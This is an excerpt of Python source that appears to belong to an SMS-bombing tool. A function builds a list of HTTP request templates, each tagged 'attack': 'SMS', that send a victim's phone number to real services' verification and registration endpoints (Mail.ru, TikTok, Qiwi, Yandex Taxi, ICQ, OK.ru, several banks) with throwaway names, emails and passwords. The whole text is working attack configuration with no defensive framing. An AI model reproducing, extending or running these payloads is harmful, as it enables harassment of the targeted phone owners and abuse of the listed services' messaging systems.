...
def urls(number):
    return [
        ...
        # --- New services from external source ---
        {
            'info': {'country': 'RU', 'attack': 'SMS', 'website': 'Cloud.Mail.ru', 'anonymous': 'No'},
            'method': 'post',
            'url': 'https://cloud.mail.ru/api/v2/notify/applink',
            'headers': {'Accept': 'application/json', 'Content-Type': 'application/json'},
            'json': {'phone': f'+{number}', 'api': 2, 'email': 'dgirherfib@gmaqil.com', 'x-email': 'x-email'},
        },
        {
            'info': {'country': 'RU', 'attack': 'SMS', 'website': 'Eda.Yandex.ru', 'anonymous': 'No'},
            'method': 'post',
        ...
        {
            'info': {'country': 'ALL', 'attack': 'SMS', 'website': 'TikTok.com', 'anonymous': 'No'},
            'method': 'post',
            'url': 'https://m.tiktok.com/node-a/send/download_link',
            'headers': {'Accept': 'application/json', 'Content-Type': 'application/json'},
            'json': {'slideVerify': 0, 'language': 'ru', 'PhoneRegionCode': '7', 'Mobile': f'{number}', 'page': {'pageName': 'home', 'launchMode': 'direct', 'trafficType': ''}},
        },
        {
            'info': {'country': 'RU', 'attack': 'SMS', 'website': 'Qiwi.com', 'anonymous': 'No'},
            'method': 'post',
            'url': 'https://mobile-api.qiwi.com/oauth/authorize',
            'headers': {'Accept': 'application/json', 'Content-Type': 'application/x-www-form-urlencoded'},
            'data': {'response_type': 'urn:qiwi:oauth:response-type:confirmation-id', 'username': f'{number}', 'client_id': 'android-qw', 'client_secret': 'zA'},
        },
        {
            'info': {'country': 'RU', 'attack': 'SMS', 'website': 'ModulBank.ru', 'anonymous': 'No'},
            'method': 'post',
            'url': 'https://my.modulbank.ru/api/v2/auth/phone',
            'headers': {'Accept': 'application/json', 'Content-Type': 'application/json'},
            'json': {'CellPhone': f'{number}'},
        },
        {
            'info': {'country': 'RU', 'attack': 'SMS', 'website': 'Webbankir.ru', 'anonymous': 'No'},
            'method': 'post',
            'url': 'https://ng-api.webbankir.com/user/v2/create',
            'headers': {'Accept': 'application/json', 'Content-Type': 'application/json'},
            'json': {'lastName': 'уцвцу', 'firstName': 'цувцу', 'middleName': 'цуацуа', 'mobilePhone': f'{number}', 'email': 'asadsd@mail.ru', 'smsCode': ''},
        },
        {
            'info': {'country': 'RU', 'attack': 'SMS', 'website': 'NN-Card.ru', 'anonymous': 'No'},
            'method': 'post',
            'url': 'https://nn-card.ru/api/1.0/register',
            'headers': {'Accept': 'application/json', 'Content-Type': 'application/json'},
            'json': {'phone': f'{number}', 'password': 'DDd7873456'},
        },
        {
            ...
            'headers': {'Accept': 'application/json', 'Content-Type': 'application/json'},
            'json': {'birthday': {'day': 12, 'month': 10, 'year': 2000}, 'client_id': 'kd1unb4b3q4t58fwlpcbzcbnm76a8fp', 'include_verification_code': True, 'password': 'Danil5564554', 'phone_number': f'{number}', 'username': 'bhtrtrrrtbhtrbhtr'},
        },
        {
            ...
            'params': {'msisdn': f'{number}'},
        },
        {
            'info': {'country': 'RU', 'attack': 'SMS', 'website': 'Sayan.Rutaxi.ru', 'anonymous': 'No'},
            'method': 'post',
            'url': 'https://sayan.rutaxi.ru/ajax_keycode.html?qip=962358614986707810&lang=ru&source=0',
            'headers': {'Content-Type': 'application/x-www-form-urlencoded'},
            'data': {'l': f'{number}'},
        },
        {
            'info': {'country': 'RU', 'attack': 'SMS', 'website': 'Shop.VSK.ru', 'anonymous': 'No'},
            'method': 'post',
            'url': 'https://shop.vsk.ru/ajax/auth/postSms/',
            'data': {'phone': f'{number}'},
        },
        {
            'info': {'country': 'RU', 'attack': 'SMS', 'website': 'Taxi.Yandex.ru', 'anonymous': 'No'},
            'method': 'post',
            'url': 'https://taxi.yandex.ru/3.0/auth',
            'headers': {'Accept': 'application/json', 'Content-Type': 'application/json'},
            'json': {'id': 'fa137685fd594a9f86f529eec9543e96', 'phone': f'{number}'},
        },
        {
            'info': {'country': 'RU', 'attack': 'SMS', 'website': 'ETM.ru', 'anonymous': 'No'},
            'method': 'post',
            'url': 'https://www.etm.ru/cat/runprog.html',
            'data': {'m_phone': f'{number}', 'mode': 'sendSms', 'syf_prog': 'clients-services', 'getSysParam': 'yes'},
        },
        {
            'info': {'country': 'ALL', 'attack': 'SMS', 'website': 'ICQ.com', 'anonymous': 'No'},
            'method': 'post',
            'url': 'https://www.icq.com/smsreg/requestPhoneValidation.php',
            'data': {'msisdn': f'{number}', 'locale': 'en', 'countryCode': 'ru', 'version': '1', 'k': 'ic1rtwz1s1Hj1O0r', 'r': '46763'},
        },
        {
        ...
        {
            'info': {'country': 'RU', 'attack': 'SMS', 'website': 'OK.ru', 'anonymous': 'No'},
            'method': 'post',
            'url': 'https://ok.ru/dk?cmd=AnonymRecoveryStartPhoneLink&st.cmd=anonymRecoveryStartPhoneLink',
            'data': {'st.r.phone': f'+{number}'},
        },
        {
